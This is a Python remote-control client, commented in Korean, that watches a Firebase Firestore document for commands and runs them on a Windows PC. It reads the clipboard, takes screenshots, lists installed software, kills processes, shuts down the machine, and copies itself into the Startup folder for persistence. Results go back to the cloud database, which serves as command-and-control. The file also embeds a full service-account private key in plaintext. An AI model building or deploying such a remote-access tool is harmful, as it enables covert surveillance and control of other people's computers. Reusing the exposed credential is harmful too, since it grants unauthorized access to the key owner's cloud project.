import firebase_admin
from firebase_admin import credentials, firestore
import datetime
import os
import socket
import platform
import psutil
import pyautogui
import pyperclip
import subprocess
import ctypes
import time
import sys
import shutil

# --------------------------
# 🔑 Firebase 초기화 (실제 JSON 키 직접 포함)
# --------------------------
service_account_info = {
  "type": "service_account",
  "project_id": "site-menu-150a1",
  "private_key_id": "8c5543ac15491387d19f9b8f2c4ec8f7b8b30ab0",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC5F5f9/NJ5mVo5\n3HccR1C+cmIqpsZBqkGivyQ9XYtwFty7ay834kbyAKup/0noxKkYJ1BDTPMwyDxu\nvjwfnxZsY3hkPKWRghNuCQwBRyJhPomfjDicIFS9SQHot6nZmVZLnRKzw9VbTgIk\nyNZl/Lo6i45oIiXk+JE2fqqVp9o5KpHJ0d0mHGn61fG/bNyzcb/rkIbst/a6e8z8\nBWTpYFLpaO3ztNHH55lfGNrnYM8w6A0tW162ZRWMaOdn+l54R1zcnGqEteTv0Z+P\nmYgWLc3VY0Jf8CQ28Ki9s/qSKeQYYwY+Ut9UmROdHi7P3jZHQDN+32todq8y7jDd\nFVtStK0xAgMBAAECggEADu7FB8Fn8auE809tb030SQkiu7IszeDAiYgbkl/Y/2K4\nzYi+NydS9fSb5OErGKkVGKpt9/VeAWeGM0u3FLivBHDvUOxGUfuejwK9LIqNTtnO\nx0fMIWcdBGW+zlmoTbKTRb0XDy2+KYRHo/7Csq5gZUIbwRxQK62Uzu1f3HxoR12c\nAkxnooYV64Bfa+2D2on2F3EphOjS/pvATRKHEkzwQcfPV+tQHjuo+L/Hy8nZWA6+\npqpUMR6d0cJwdQknk8ZlH+9st6GWHltXHuAhfofO9S94hIDJKOPIlW5vRTDSb6LH\nIQ1t6xeEsGLsnlhqTgcjLfHj9fJMyVF+cYy/5urEKQKBgQDlnGfml22p8GBtMjMd\nIEb2VsC+WfuxfPj0Yff6DXbLlk34z1ZfyJJumgA1NCT9ZN6aRyndL120rvniVqIt\nkhjGO28lyEHCbhi98EpBI5VbsV/BM47tgfmKC5lenjSh/fMhp0DfK2F7rjzJrRI3\nviQmzwcqJre8BYCij025oXulcwKBgQDOXVwN6gtFVp81hQOH/SVmEEfHw0P5OEc3\nVM6xinksO4GtdwCLrkKUuFeYlWz0/CjizgBu/nv8r9gTU/QhbNEIyEWK4/rggAmi\nijQc9CV2czyFyloILVmw/LbuigxStFil0RyzzB8KTNROUXQiHgEq8aQQt87DW/37\nINrlZW7ZywKBgQDByKoL/DtqlFvdbOOkrkwVtYwAWxNIbY/zOQe/e0OKeTUfS2W7\nexzSyZhpTrP1Q/93N55GdaZhStfMxY8kZMwR6bFZstSFEsRA8Z7JsQ1qEJ4fAbOc\nEfkYH8f2ChGjsh9ThMQEVal1Z80X7MCWWRxLwKhsU7b3sbEqAUX46CfhrwKBgQCE\nc8ex5pZ1WrO1Vjp9/i0S5UAtJ1dpjoWnLfe8XHSJv2fsPoVLIf36Fpeih8X3OCHF\n8RK2KwDJntPBFBGNoppIWMLJ8qoDjiqg+LOaIdopvK0L8mT2+qSmxI1lbZWbP8Xm\nJ+GURV9m7QkXe5BelYOKXK5BTLiZC2Jo3R2iPwh3IQKBgCZ2a4cJWaI+rylSKzR9\nIiZUo7RfIqQdj0UcipNDsNZWBAzEkjRqJcCDcRaSLv96DV5L9nmGBl9IWfDYDp/Y\nRH2g9m8iwO0PJYQvrfwLlI2aCJxtY787csmMuO4atPwBjmdHe97+Hfy02gDTWGcj\nEguG2kYcozFfk4LinzxzW21K\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@site-menu-150a1.iam.gserviceaccount.com",
  "client_id": "106283840422259211419",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40site-menu-150a1.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

cred = credentials.Certificate(service_account_info)
firebase_admin.initialize_app(cred)
db = firestore.client()

commands_ref = db.collection("commands").document("pc1")
logs_ref = db.collection("logs")

# ✅ 결과 반영 함수
def set_result(command, result, log_id=None):
    now = datetime.datetime.now()

    commands_ref.update({
        "result": result,
        "timestamp": now
    })

    if log_id:
        logs_ref.document(log_id).update({
            "result": result,
            "timestamp": now
        })
    else:
        logs_ref.add({
            "command": command,
            "result": result,
            "timestamp": now
        })

# ✅ 명령 처리 함수
def handle_command(command, log_id=None):
    try:
        if command == "!정보":
            result = f"""💻 OS: {platform.system()} {platform.release()}
🔧 CPU: {platform.processor()}
💾 RAM: {round(psutil.virtual_memory().total/1e9,2)} GB"""

        elif command == "!상태":
            cpu = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory().percent
            result = f"⚡ CPU 사용률: {cpu}% | 메모리 사용률: {mem}%"

        elif command == "!가동시간":
            uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())
            result = f"⏱️ 가동 시간: {uptime}"

        elif command == "!속도측정":
            try:
                output = subprocess.check_output(
                    ["speedtest-cli", "--simple"],
                    text=True,
                    encoding="utf-8",
                    errors="ignore"
                )
                result = "📡 속도 측정 결과:\n" + output
            except Exception as e:
                result = f"❌ 속도 측정 오류: {e}"

        elif command == "!클립보드읽기":
            result = pyperclip.paste()

        elif command == "!pc종료":
            os.system("shutdown /s /t 1")
            result = "🛑 PC 종료 실행됨"

        elif command == "!pc재시작":
            os.system("shutdown /r /t 1")
            result = "🔄 PC 재시작 실행됨"

        elif command.startswith("!프로세스종료"):
            parts = command.split(" ", 1)
            if len(parts) == 2:
                proc_name = parts[1]
                killed = False
                for p in psutil.process_iter(['pid', 'name']):
                    if proc_name.lower() in p.info['name'].lower():
                        psutil.Process(p.info['pid']).terminate()
                        killed = True
                result = f"✅ 프로세스 종료됨: {proc_name}" if killed else f"❌ 프로세스 찾을 수 없음: {proc_name}"
            else:
                result = "⚠️ 사용법: !프로세스종료 [프로세스명]"

        elif command.startswith("!알림창"):
            parts = command.split(" ", 2)
            title = parts[1] if len(parts) > 1 else "알림"
            content = parts[2] if len(parts) > 2 else "내용 없음"
            ctypes.windll.user32.MessageBoxW(0, content, title, 1)
            result = f"✅ 알림창 표시됨 ({title})"

        elif command == "!캡처":
            filename = "capture.png"
            pyautogui.screenshot(filename)
            result = f"📷 캡처 완료 (로컬 저장: {filename})"

        elif command == "!설치된프로그램":
            try:
                installed = subprocess.check_output('wmic product get name', shell=True).decode(errors="ignore")
                result = installed[:1500] + "..." if len(installed) > 1500 else installed
            except Exception as e:
                result = f"❌ 설치된 프로그램 목록 오류: {e}"

        elif command == "!종료":
            result = "🛑 클라이언트 종료됨"
            set_result(command, result, log_id)
            os._exit(0)

        elif command == "!위치":
            try:
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                result = f"🌍 호스트: {hostname}\nIP: {ip}"
            except Exception as e:
                result = f"❌ 위치 확인 오류: {e}"

        elif command.startswith("!다운로드"):
            parts = command.split(" ", 1)
            if len(parts) == 2 and os.path.exists(parts[1]):
                result = f"📂 파일 준비 완료: {parts[1]} (업로드 기능 필요)"
            else:
                result = "❌ 파일 없음 또는 경로 오류"

        elif command == "!자동시작등록":
            try:
                exe_path = sys.executable
                startup = os.path.join(
                    os.environ["APPDATA"],
                    "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                    "client.exe"
                )
                shutil.copyfile(exe_path, startup)
                result = f"✅ 자동 시작 등록 완료 ({startup})"
            except Exception as e:
                result = f"❌ 자동 시작 등록 실패: {e}"

        elif command == "!자동시작해제":
            try:
                startup = os.path.join(
                    os.environ["APPDATA"],
                    "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                    "client.exe"
                )
                if os.path.exists(startup):
                    os.remove(startup)
                    result = "✅ 자동 시작 해제 완료"
                else:
                    result = "⚠️ 자동 시작에 등록된 파일 없음"
            except Exception as e:
                result = f"❌ 자동 시작 해제 실패: {e}"

        else:
            result = "❓ 알 수 없는 명령"

    except Exception as e:
        result = f"❌ 오류: {e}"

    set_result(command, result, log_id)

# ✅ Firestore 명령 감시
def on_snapshot(doc_snapshot, changes, read_time):
    for doc in doc_snapshot:
        data = doc.to_dict()
        cmd = data.get("command")
        res = data.get("result", "")
        log_id = data.get("logId")

        if cmd and (res == "" or res == "(대기 중)"):
            print(f"📥 새 명령 감지: {cmd}")
            handle_command(cmd, log_id)

commands_ref.on_snapshot(on_snapshot)

print("🚀 클라이언트 실행됨 (실시간 명령 감시 중)")

while True:
    time.sleep(1)
